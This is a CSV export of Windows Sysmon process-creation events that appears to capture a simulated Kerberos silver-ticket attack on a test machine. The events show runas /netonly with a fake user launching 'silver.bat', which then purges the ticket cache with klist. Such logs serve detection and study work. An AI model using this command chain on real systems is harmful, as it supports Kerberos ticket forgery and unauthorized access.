Microsoft-Windows-Sysmon/Operational,klist  purge,Microsoft Corporation,WinDev2309Eval,,C:\Windows\System32\,Tool for managing the Kerberos ticket cache,,,,,,,1,9462,,10.0.22621.1 (WinBuild.160101.0800),"MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B",C:\Windows\System32\klist.exe,,Medium,0x8000000000000000,Information,{fda94052-43fa-658d-67f0-cc0000000000},0xccf067,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:35.599

ProcessGuid: {fda94052-43fb-658d-6e02-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist  purge

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43fa-658d-67f0-cc0000000000}

LogonId: 0xCCF067

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43fa-658d-6a02-000000000b00}

ParentProcessId: 10308

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat

ParentUser: WINDEV2309EVAL\User",Info,klist.exe,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat,C:\Windows\System32\cmd.exe,{fda94052-43fa-658d-6a02-000000000b00},10308,WINDEV2309EVAL\User,{fda94052-43fb-658d-6e02-000000000b00},7044,3524,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:35.6017261Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:35.599,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:35.6017261Z""/>
      <EventRecordID>9462</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:35.599</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fb-658d-6e02-000000000b00}</Data>
      <Data Name=""ProcessId"">3524</Data>
      <Data Name=""Image"">C:\Windows\System32\klist.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Tool for managing the Kerberos ticket cache</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">klist.exe</Data>
      <Data Name=""CommandLine"">klist  purge</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\System32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43fa-658d-67f0-cc0000000000}</Data>
      <Data Name=""LogonId"">0xccf067</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43fa-658d-6a02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">10308</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:35.599

ProcessGuid: {fda94052-43fb-658d-6e02-000000000b00}

ProcessId: 3524

Image: C:\Windows\System32\klist.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Tool for managing the Kerberos ticket cache

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: klist.exe

CommandLine: klist  purge

CurrentDirectory: C:\Windows\System32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43fa-658d-67f0-cc0000000000}

LogonId: 0xCCF067

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=3AA443B428CD290BD8415E7FDD5FB82A,SHA256=430E7845BB559CBAB9BEA4F87F86B14ACDC33F596EED7300A0208C9D0F99829E,IMPHASH=85207CDD890ACE87BF7EF7906D90318B

ParentProcessGuid: {fda94052-43fa-658d-6a02-000000000b00}

ParentProcessId: 10308

ParentImage: C:\Windows\System32\cmd.exe

ParentCommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9461,,-,"MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:35.012

ProcessGuid: {fda94052-43fb-658d-6d02-000000000b00}

ProcessId: 1828

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43fb-658d-6d02-000000000b00},7044,1828,-,,,,,"
      ",-,,,,,,2023-12-28T09:46:35.0140326Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:35.012,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:35.0140326Z""/>
      <EventRecordID>9461</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:35.012</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fb-658d-6d02-000000000b00}</Data>
      <Data Name=""ProcessId"">1828</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:35.012

ProcessGuid: {fda94052-43fb-658d-6d02-000000000b00}

ProcessId: 1828

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=9F6CCA1BECAEEC3FE38A7D322A3204A8,SHA256=9F43EDB6639B10481A8FCC0734BD66AF0A9021D1723D1377A625C6A66FCF3DDB,IMPHASH=5B10822D7E57F54AD8CF4D784949C5C5

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding",-,WinDev2309Eval,,C:\Windows\system32\,-,,,,,,,1,9460,,-,"MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB",C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.947

ProcessGuid: {fda94052-43fa-658d-6c02-000000000b00}

ProcessId: 2420

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -",Info,-,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-43fa-658d-6c02-000000000b00},7044,2420,-,,,,,"
      ",-,,,,,,2023-12-28T09:46:34.9492968Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:34.947,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:34.9492968Z""/>
      <EventRecordID>9460</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:34.947</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fa-658d-6c02-000000000b00}</Data>
      <Data Name=""ProcessId"">2420</Data>
      <Data Name=""Image"">C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe</Data>
      <Data Name=""FileVersion"">-</Data>
      <Data Name=""Description"">-</Data>
      <Data Name=""Product"">-</Data>
      <Data Name=""Company"">-</Data>
      <Data Name=""OriginalFileName"">-</Data>
      <Data Name=""CommandLine"">""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.947

ProcessGuid: {fda94052-43fa-658d-6c02-000000000b00}

ProcessId: 2420

Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe

FileVersion: -

Description: -

Product: -

Company: -

OriginalFileName: -

CommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.17.11461.0_x64__8wekyb3d8bbwe\OpenConsole.exe"" -Embedding

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8C608622D60DD9E76274883252698EC2,SHA256=A1686717DA0D79F2DB071A6866677BFD492B44EAA47EB375A992145A6F4BD874,IMPHASH=3815098BF50AB7C56CCBDE82FF05FFDB

ParentProcessGuid: {00000000-0000-0000-0000-000000000000}

ParentProcessId: 932

ParentImage: -

ParentCommandLine: -

ParentUser: -</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,,,,,,,1,9459,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-43fa-658d-67f0-cc0000000000},0xccf067,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.907

ProcessGuid: {fda94052-43fa-658d-6a02-000000000b00}

ProcessId: 10308

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43fa-658d-67f0-cc0000000000}

LogonId: 0xCCF067

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43fa-658d-6802-000000000b00}

ParentProcessId: 1732

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat",C:\Windows\System32\runas.exe,{fda94052-43fa-658d-6802-000000000b00},1732,WINDEV2309EVAL\User,{fda94052-43fa-658d-6a02-000000000b00},7044,10308,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:34.9090709Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:34.907,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:34.9090709Z""/>
      <EventRecordID>9459</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:34.907</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fa-658d-6a02-000000000b00}</Data>
      <Data Name=""ProcessId"">10308</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-43fa-658d-67f0-cc0000000000}</Data>
      <Data Name=""LogonId"">0xccf067</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43fa-658d-6802-000000000b00}</Data>
      <Data Name=""ParentProcessId"">1732</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.907

ProcessGuid: {fda94052-43fa-658d-6a02-000000000b00}

ProcessId: 10308

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: C:\Windows\system32\cmd.exe /c C:\Users\User\AppData\Local\Temp\silver.bat

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-43fa-658d-67f0-cc0000000000}

LogonId: 0xCCF067

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-43fa-658d-6802-000000000b00}

ParentProcessId: 1732

ParentImage: C:\Windows\System32\runas.exe

ParentCommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Services,,,,,,,1,9458,,10.0.22621.1 (WinBuild.160101.0800),"MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791",C:\Windows\System32\svchost.exe,,System,0x8000000000000000,Information,{fda94052-34eb-658d-e703-000000000000},0x3e7,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.750

ProcessGuid: {fda94052-43fa-658d-6902-000000000b00}

ProcessId: 1788

Image: C:\Windows\System32\svchost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Host Process for Windows Services

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: svchost.exe

CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM",Info,svchost.exe,C:\Windows\system32\services.exe,C:\Windows\System32\services.exe,{fda94052-34eb-658d-0b00-000000000b00},788,NT AUTHORITY\SYSTEM,{fda94052-43fa-658d-6902-000000000b00},7044,1788,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:34.7512182Z,,,Process Create (rule: ProcessCreate),0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:46:34.750,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:34.7512182Z""/>
      <EventRecordID>9458</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:34.750</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fa-658d-6902-000000000b00}</Data>
      <Data Name=""ProcessId"">1788</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Services</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">svchost.exe</Data>
      <Data Name=""CommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-34eb-658d-0b00-000000000b00}</Data>
      <Data Name=""ParentProcessId"">788</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.750

ProcessGuid: {fda94052-43fa-658d-6902-000000000b00}

ProcessId: 1788

Image: C:\Windows\System32\svchost.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Host Process for Windows Services

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: svchost.exe

CommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s seclogon

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

LogonGuid: {fda94052-34eb-658d-e703-000000000000}

LogonId: 0x3E7

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=8EC922C7A58A8701AB481B7BE9644536,SHA256=949BFB5B4C7D58D92F3F9C5F8EC7CA4CEAFFD10EC5F0020F0A987C472D61C54B,IMPHASH=76B4BAE80D2C3B08BB062D97BF9CA791

ParentProcessGuid: {fda94052-34eb-658d-0b00-000000000b00}

ParentProcessId: 788

ParentImage: C:\Windows\System32\services.exe

ParentCommandLine: C:\Windows\system32\services.exe

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
